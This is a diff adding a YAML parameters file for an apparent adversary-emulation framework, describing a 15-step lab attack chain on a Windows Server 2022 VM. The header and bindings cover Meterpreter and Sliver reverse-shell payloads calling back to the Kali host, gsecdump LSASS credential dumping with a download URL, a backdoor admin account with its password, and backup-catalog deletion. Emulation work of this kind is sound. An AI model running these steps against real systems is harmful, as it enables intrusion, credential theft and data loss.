@@ -1,0 +1,120 @@
+# Aurora attack-chain parameters file — chain-005 (env0)
+#
+# Chain narrative (longest of the 5 pilot batch, 15 steps, cross-C2):
+#   PHASE A — Meterpreter path (steps 1-8):
+#     msfvenom Meterpreter EXE → victim runs non-elev → Meterpreter
+#     session 1 (medium) → arp discovery → victim RE-runs same EXE as
+#     Admin via LNK-root → Meterpreter session 2 (elevated) →
+#     meterpreter-shell-windows derives cmd from elevated Meterpreter.
+#
+#   PHASE B — Sliver path (steps 9-13):
+#     sliver Windows EXE payload → victim runs it AS ADMIN
+#     (right-click → Run as administrator) → elevated Sliver session
+#     → sliver-powershell derives PS from Sliver session → gsecdump
+#     LSASS dump (T1003, downloads gsecdump-v2b5.exe from web.archive.
+#     org, runs against LSASS; expected uncertainty — see note below).
+#
+#   PHASE C — impact/persistence via elevated Meterpreter cmd (14-15):
+#     net user add (T1136.001 backdoor admin account creation)
+#     → wbadmin delete catalog (T1490 impact — EXPECTED TO FAIL because
+#     wbadmin.exe was removed from Win10/11/Server 2022 client SKUs and
+#     the action was moved to _parked/ on 2026-07-14 AFTER this chain
+#     was frozen; not a chain-005 defect, just a frozen artifact
+#     referencing a since-parked action).
+#
+#   Chain-005 is NOT surgeried (no -fixed sibling folder) because it
+#   never selected a VSS-family action to begin with. It is the ONLY
+#   chain in the 5-pilot batch that mixes two C2 backends (Meterpreter
+#   AND Sliver) — narrative diversity value: high, but complexity is
+#   also high (2 payloads, 2 handlers, 3 manual victim actions).
+#
+# Attacker: Kali at 192.168.56.43 with BOTH msfconsole AND sliver-server
+#           running concurrently
+# Victim:   Windows Server 2022 VM, RDP as useradmin (medium-integrity
+#           split token, admin group, NOT built-in Administrator)
+#
+# Notes on likely-uncertain steps:
+#   Step 13 (gsecdump-lsass) — depends on:
+#     (a) web.archive.org URL still serving the archived binary
+#     (b) hash still matching (unlikely to have changed but web.archive.
+#         org's caching can occasionally serve variants)
+#     (c) target LSASS not being LSA-protected (RunAsPPL=1) — env0
+#         Server 2022 default MAY have RunAsPPL enabled; gsecdump can't
+#         read protected LSASS if so
+#     (d) Defender not signature-matching gsecdump-v2b5.exe (very likely
+#         to be flagged as HackTool:Win32/GSecDump or similar since it's
+#         a well-known TrueSec forensic tool)
+#     Any of a-d failing → step 13 ✗. Documented outcome regardless.
+#
+#   Step 15 (wbadmin) — expected ✗ (wbadmin.exe absent per chain-004-
+#   fixed pilot 2026-07-14 diagnostic).
+
+pddl_bindings:
+  # used by: 1_msfvenom-1.SAVE_PATH
+  # Attacker-side path for the msfvenom Meterpreter EXE (phase A payload).
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe
+
+  # used by: 3_simulate-download-execute-file.SAVE_PATH,
+  #          6_simulate-execute-lnk-windows-root.EXE_PATH
+  # Victim-side path for the Meterpreter payload — downloaded at
+  # step 3, re-executed elevated via LNK-root at step 6.
+  string1_var_in_plan: C:\Users\Public\chain_mp.exe
+
+  # used by: 9_sliver-payload-windows-exe.SAVE_PATH
+  # Attacker-side path for the sliver payload (phase B payload).
+  string3_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe
+
+  # used by: 10_simulate-download-execute-file-root.SAVE_PATH
+  # Victim-side path for the sliver payload — downloaded and
+  # run-as-admin at step 10 to establish the elevated Sliver session.
+  string4_var_in_plan: C:\Users\Public\chain_sl.exe
+
+steps:
+  "1_msfvenom-1":
+    LHOST: 192.168.56.43       # attacker IP baked into Meterpreter payload
+    LPORT: 4444                # must match handler LPORT in step 2
+
+  "2_set-msf-payload-handler-for-file":
+    LHOST: 192.168.56.43                            # match step 1 LHOST
+    LPORT: 4444                                     # match step 1 LPORT
+    payload_name: windows/meterpreter/reverse_tcp   # match msfvenom -p in step 1
+
+  "3_simulate-download-execute-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali —
+                               # serves BOTH Meterpreter payload (this
+                               # step) AND Sliver payload (step 10)
+                               # from msf_save + sliver_save dirs;
+                               # operator navigates to the appropriate
+                               # subdir via browser at each download step
+
+  "9_sliver-payload-windows-exe":
+    LHOST: 192.168.56.43       # attacker IP baked into Sliver implant
+    LPORT: 8443                # sliver's default mtls listener port —
+                               # DIFFERENT from msfvenom's 4444 so both
+                               # handlers can run concurrently
+
+  "10_simulate-download-execute-file-root":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP (same server
+                               # as step 3, different subdir)
+    LPORT: 8000
+
+  "13_art-t1003-gsecdump-lsass":
+    # ART canonical defaults — keep them since the action is Method 3
+    # (fold get_prereq_command from ART). Any change here breaks the
+    # ART-provenance of the credential-access step. Expected outcomes
+    # documented in the header note above.
+    gsecdump_exe: 'C:\Users\Public\gsecdump.exe'
+    gsecdump_url: 'https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe'
+    gsecdump_bin_hash: '94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC'
+
+  "14_art-t1136_001-net-user-add":
+    username: 'AuroraSvc005'   # unique enough to avoid earlier-pilot
+                               # residue (chain-004 used 'BackupAdmin',
+                               # chain-001 used 'AuroraPilot001'); if
+                               # a previous chain-005 run left this
+                               # account, `net user AuroraSvc005 /delete`
+                               # on target first.
+    password: 'CplexPass!23'   # 12 chars — under the 14-char legacy
+                               # warning threshold (chain-001-fixed
+                               # pilot diagnostic surfaced this).
